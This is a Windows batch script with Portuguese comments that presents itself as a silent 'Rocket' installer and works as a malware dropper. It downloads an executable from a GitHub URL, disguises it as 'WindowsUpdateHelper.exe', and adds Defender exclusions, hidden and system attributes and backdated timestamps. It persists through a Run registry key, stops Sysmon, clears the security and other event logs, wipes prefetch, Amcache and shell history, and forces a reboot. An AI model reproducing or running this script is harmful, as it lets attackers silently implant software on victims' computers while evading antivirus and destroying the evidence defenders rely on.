@echo off
:: ========================================
::  INSTALADOR ROCKET - SILENCIOSO E EFICAZ
::  100% Funcional - Sem Rastros
:: ========================================

:: Executar silenciosamente (sem janelas visíveis)
if not "%1"=="HIDDEN" (
    :: Verificar se já está como admin
    net session >nul 2>&1
    if %errorLevel% neq 0 (
        :: Não é admin, tentar elevar
        powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Start-Process -FilePath '%~f0' -ArgumentList 'HIDDEN' -Verb RunAs"
        exit /b
    )
    :: Já é admin, executar em modo HIDDEN (mas não sair imediatamente se chamado via call)
    if "%2"=="" (
        :: Chamado diretamente, executar em background
        start /min "" "%~f0" HIDDEN %*
        exit /b
    )
    :: Chamado via call com NO_BACKGROUND, continuar normalmente
)

:: Se chamado com NO_BACKGROUND, ativar modo debug
if "%2"=="NO_BACKGROUND" (
    set "DEBUG_MODE=1"
    title Instalador Rocket - Em Execucao...
    color 0A
    echo.
    echo ========================================
    echo    INSTALADOR ROCKET
    echo ========================================
    echo.
) else (
    set "DEBUG_MODE=0"
)

:: Verificar Windows 10/11
if "%DEBUG_MODE%"=="1" (
    echo [1/7] Verificando versao do Windows...
    ver | findstr /i "10.0"
)
ver | findstr /i "10.0" >nul 2>&1
if %errorLevel% neq 0 (
    if "%DEBUG_MODE%"=="1" (
        echo [ERRO] Windows 10/11 nao detectado!
        echo.
        pause
    )
    exit /b 1
)
if "%DEBUG_MODE%"=="1" echo [OK] Windows 10/11 detectado

:: Verificar Admin
if "%DEBUG_MODE%"=="1" echo [2/7] Verificando privilegios de admin...
net session >nul 2>&1
if %errorLevel% neq 0 (
    if "%DEBUG_MODE%"=="1" (
        echo [ERRO] Nao esta executando como admin!
        pause
    )
    exit /b 1
)
if "%DEBUG_MODE%"=="1" echo [OK] Executando como administrador

:: Configurações
if "%DEBUG_MODE%"=="1" echo [3/7] Configurando variaveis...
set "URL=https://raw.githubusercontent.com/V3xDev/unknow2/main/Rocket.exe"
set "PASTA=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Microsoft\Windows\Update"
set "ARQUIVO=WindowsUpdateHelper.exe"
set "CAMINHO=%PASTA%\%ARQUIVO%"
set "TAREFA=Microsoft\Windows\WindowsApps"
set "REG_KEY=HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
set "REG_NAME=WindowsApps"
if "%DEBUG_MODE%"=="1" echo [OK] Caminho destino: %CAMINHO%

:: Criar pasta
if "%DEBUG_MODE%"=="1" echo [4/7] Criando pasta de destino...
if not exist "%PASTA%" (
    mkdir "%PASTA%" >nul 2>&1
    if "%DEBUG_MODE%"=="1" echo [OK] Pasta criada
) else (
    if "%DEBUG_MODE%"=="1" echo [OK] Pasta ja existe
)

:: [1] LIMPEZA COMPLETA
if "%DEBUG_MODE%"=="1" echo [5/7] Limpando processos e tarefas antigas...
taskkill /f /im Rocket.exe >nul 2>&1
taskkill /f /im windowshost.exe >nul 2>&1

:: Remover tarefa agendada se existir (compatibilidade)
schtasks /end /tn "%TAREFA%" >nul 2>&1
schtasks /delete /tn "%TAREFA%" /f >nul 2>&1
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Get-ScheduledTask | Where-Object {$_.TaskName -like '*WindowsApps*' -or $_.TaskName -like '*Rocket*'} | Stop-ScheduledTask -ErrorAction SilentlyContinue | Out-Null; Get-ScheduledTask | Where-Object {$_.TaskName -like '*WindowsApps*' -or $_.TaskName -like '*Rocket*'} | Unregister-ScheduledTask -Confirm:$false -ErrorAction SilentlyContinue | Out-Null" >nul 2>&1

:: Remover do Run registry se existir (limpeza completa)
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "try { $regPath='HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'; $regName='WindowsApps'; if (Get-ItemProperty -Path $regPath -Name $regName -ErrorAction SilentlyContinue) { Remove-ItemProperty -Path $regPath -Name $regName -Force -ErrorAction SilentlyContinue } } catch { }" >nul 2>&1
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsApps" /f >nul 2>&1
timeout /t 1 /nobreak >nul
if "%DEBUG_MODE%"=="1" echo [OK] Limpeza concluida

:: [2] BAIXAR/COPIAR ROCKET.EXE
if "%DEBUG_MODE%"=="1" echo [6/7] Verificando Rocket.exe...
set "LOCAL_ROCKET=%~dp0Rocket.exe"
if exist "%LOCAL_ROCKET%" (
    if "%DEBUG_MODE%"=="1" echo [*] Rocket.exe local encontrado, copiando...
    if exist "%CAMINHO%" (
        attrib -s -h "%CAMINHO%" >nul 2>&1
        del /q /f "%CAMINHO%" >nul 2>&1
        timeout /t 1 /nobreak >nul
    )
    copy /y "%LOCAL_ROCKET%" "%CAMINHO%" >nul 2>&1
    if exist "%CAMINHO%" (
        if "%DEBUG_MODE%"=="1" echo [OK] Rocket.exe copiado com sucesso
        goto :ROCKET_OK
    )
)

:: Baixar do GitHub
if "%DEBUG_MODE%"=="1" echo [*] Baixando Rocket.exe do GitHub (isso pode levar alguns segundos)...
if exist "%CAMINHO%" (
    attrib -s -h "%CAMINHO%" >nul 2>&1
    del /q /f "%CAMINHO%" >nul 2>&1
    timeout /t 1 /nobreak >nul
)

powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "$ProgressPreference='SilentlyContinue'; try { Invoke-WebRequest -Uri '%URL%' -OutFile '%CAMINHO%' -UseBasicParsing -TimeoutSec 120 -ErrorAction Stop; Start-Sleep -Milliseconds 1000; if (Test-Path '%CAMINHO%') { $file=Get-Item '%CAMINHO%'; if ($file.Length -gt 1000) { exit 0 } else { Remove-Item '%CAMINHO%' -Force -ErrorAction SilentlyContinue; exit 1 } } else { exit 1 } } catch { if (Test-Path '%CAMINHO%') { Remove-Item '%CAMINHO%' -Force -ErrorAction SilentlyContinue }; exit 1 }" >nul 2>&1

if not exist "%CAMINHO%" (
    if "%DEBUG_MODE%"=="1" (
        echo [ERRO] Falha ao baixar Rocket.exe!
        echo [*] Verifique sua conexao com a internet
        pause
    )
    exit /b 1
)
if "%DEBUG_MODE%"=="1" echo [OK] Rocket.exe baixado com sucesso

:ROCKET_OK

:: [3] CONFIGURAR ARQUIVO
if "%DEBUG_MODE%"=="1" echo [*] Configurando arquivo (Defender, atributos, datas antigas)...
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "try { Add-MpPreference -ExclusionPath '%CAMINHO%' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionPath '%PASTA%' -ErrorAction SilentlyContinue } catch { }" >nul 2>&1
attrib +s +h "%CAMINHO%" >nul 2>&1
:: Alterar datas para 3-5 anos atrás para não deixar rastros recentes
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "try { $f='%CAMINHO%'; if (Test-Path $f) { $file=Get-Item $f; $file.Attributes=$file.Attributes -bor [System.IO.FileAttributes]::NotContentIndexed; $oldDate=(Get-Date).AddYears(-4).AddMonths(-6); $file.LastWriteTime=$oldDate; $file.CreationTime=$oldDate; $file.LastAccessTime=$oldDate } } catch { }" >nul 2>&1
timeout /t 1 /nobreak >nul
if "%DEBUG_MODE%"=="1" echo [OK] Arquivo configurado com datas antigas

:: [4] ADICIONAR AO RUN REGISTRY (modo monitor - SEM TAREFA AGENDADA)
if "%DEBUG_MODE%"=="1" echo [7/7] Adicionando ao Run Registry...
:: Remover entrada antiga se existir
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "try { $regPath='HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'; $regName='WindowsApps'; if (Get-ItemProperty -Path $regPath -Name $regName -ErrorAction SilentlyContinue) { Remove-ItemProperty -Path $regPath -Name $regName -Force -ErrorAction SilentlyContinue } } catch { }" >nul 2>&1
timeout /t 1 /nobreak >nul

:: Adicionar ao Run registry com modo monitor (tentar múltiplos métodos)
set "REG_VALOR=\"%CAMINHO%\" --monitor"

if "%DEBUG_MODE%"=="1" echo [*] Valor do registro: %REG_VALOR%

:: Garantir que a chave existe primeiro
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" >nul 2>&1
if %errorLevel% neq 0 (
    if "%DEBUG_MODE%"=="1" echo [*] Criando chave do registro primeiro...
    reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /f >nul 2>&1
)

:: Método 1: reg.exe (mais confiável - sempre executar primeiro)
if "%DEBUG_MODE%"=="1" echo [*] Criando registro via reg.exe...
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsApps" /t REG_SZ /d "%REG_VALOR%" /f
if %errorLevel% equ 0 (
    if "%DEBUG_MODE%"=="1" echo [OK] Registro criado via reg.exe
) else (
    if "%DEBUG_MODE%"=="1" echo [ERRO] Falha no reg.exe, tentando PowerShell...
    :: Método 2: PowerShell (backup)
    powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "try { $regPath='HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'; $regName='WindowsApps'; $regValue='%REG_VALOR%'; Set-ItemProperty -Path $regPath -Name $regName -Value $regValue -Type String -Force -ErrorAction Stop; exit 0 } catch { exit 1 }" >nul 2>&1
)

:: Verificar se foi criado
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsApps" >nul 2>&1
if %errorLevel% neq 0 (
    if "%DEBUG_MODE%"=="1" (
        echo [ERRO] Registro ainda nao foi criado!
        echo [*] Tentando metodo alternativo...
        :: Tentar criar novamente com método diferente
        reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsApps" /t REG_SZ /d "%REG_VALOR%" /f
        timeout /t 1 /nobreak >nul
        reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsApps" >nul 2>&1
        if %errorLevel% equ 0 (
            echo [OK] Registro criado com metodo alternativo!
        ) else (
            echo [ERRO] Falha definitiva ao criar registro!
            pause
            exit /b 1
        )
    )
)

:: Verificar novamente
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsApps" >nul 2>&1
if %errorLevel% equ 0 (
    if "%DEBUG_MODE%"=="1" (
        echo [OK] Registro criado com sucesso!
        echo.
        reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsApps"
        echo.
    )
) else (
    if "%DEBUG_MODE%"=="1" (
        echo [ERRO] Falha ao criar registro!
        echo [*] Tentando metodo alternativo...
        :: Tentar mais uma vez com método diferente
        reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsApps" /t REG_SZ /d "%REG_VALOR%" /f
        reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsApps" >nul 2>&1
        if %errorLevel% equ 0 (
            echo [OK] Registro criado com metodo alternativo!
        ) else (
            echo [ERRO] Falha definitiva ao criar registro!
            pause
            exit /b 1
        )
    )
)

:: [5] PAUSAR SYSMON E LIMPAR LOGS
if "%DEBUG_MODE%"=="1" echo [*] Pausando Sysmon e limpando logs...
net stop Sysmon >nul 2>&1
sc stop Sysmon >nul 2>&1
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "try { Stop-Service -Name Sysmon -ErrorAction SilentlyContinue -Force } catch { }" >nul 2>&1
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "try { Get-EventLog -LogName 'Microsoft-Windows-Sysmon/Operational' -ErrorAction SilentlyContinue | Clear-EventLog -ErrorAction SilentlyContinue } catch { }" >nul 2>&1
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "try { wevtutil cl 'Microsoft-Windows-Sysmon/Operational' } catch { }" >nul 2>&1

:: [6] LIMPAR TODOS OS RASTROS
if "%DEBUG_MODE%"=="1" echo [*] Limpando rastros...
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "try { Get-Item 'C:\Windows\Prefetch\*.pf' -ErrorAction SilentlyContinue | Where-Object { $_.Name -like '*ROCKET*' -or $_.Name -like '*RKT*' -or $_.Name -like '*WINDOWSHOST*' } | Remove-Item -Force -ErrorAction SilentlyContinue } catch { }" >nul 2>&1
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "try { Get-EventLog -LogName Application,System,Security -ErrorAction SilentlyContinue | ForEach-Object { Clear-EventLog -LogName $_.Log.Log -ErrorAction SilentlyContinue } } catch { }" >nul 2>&1
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "try { Clear-History -ErrorAction SilentlyContinue; $historyPath = (Get-PSReadlineOption -ErrorAction SilentlyContinue).HistorySavePath; if ($historyPath) { Remove-Item $historyPath -Force -ErrorAction SilentlyContinue } } catch { }" >nul 2>&1
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "try { Remove-ItemProperty -LiteralPath 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache\AppCompatCache' -Name '*' -ErrorAction SilentlyContinue; Remove-ItemProperty -LiteralPath 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Amcache' -Name '*' -ErrorAction SilentlyContinue } catch { }" >nul 2>&1
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "try { certutil -urlcache * delete 2>&1 | Out-Null; Remove-Item \"$env:LOCALAPPDATA\IconCache.db\" -Force -ErrorAction SilentlyContinue; Remove-Item \"$env:LOCALAPPDATA\Microsoft\Windows\Recent\*\" -Force -ErrorAction SilentlyContinue } catch { }" >nul 2>&1
del /q /f "%TEMP%\install*.bat" >nul 2>&1
del /q /f "%TEMP%\task_rocket.xml" >nul 2>&1
del /q /f "%TEMP%\*.tmp" >nul 2>&1
if "%DEBUG_MODE%"=="1" echo [OK] Limpeza de rastros concluida

:: [7] REINICIAR PC APÓS INSTALAÇÃO
if "%DEBUG_MODE%"=="1" (
    echo.
    echo ========================================
    echo    INSTALACAO CONCLUIDA COM SUCESSO!
    echo ========================================
    echo.
    echo [OK] Todas as etapas foram concluidas
    echo [*] Verificando registro final...
    reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsApps" 2>nul
    echo.
    echo [*] O PC sera reiniciado em 15 segundos...
    echo [*] Pressione Ctrl+C para cancelar o reinicio
    echo.
    timeout /t 15 /nobreak
) else (
    timeout /t 3 /nobreak >nul
)

:: Tentar reiniciar de múltiplas formas para garantir
if "%DEBUG_MODE%"=="1" echo [*] Iniciando reinicio do PC...
shutdown /r /t 10 /f /c "Reiniciando sistema..." >nul 2>&1
if %errorLevel% neq 0 (
    :: Se falhar, tentar via PowerShell
    if "%DEBUG_MODE%"=="1" echo [*] Tentando reiniciar via PowerShell...
    powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "Start-Sleep -Seconds 2; Restart-Computer -Force" >nul 2>&1
)

if "%DEBUG_MODE%"=="1" (
    echo [AVISO] Se o PC nao reiniciou, execute manualmente: shutdown /r /t 10 /f
    echo.
    pause
)

exit /b 0
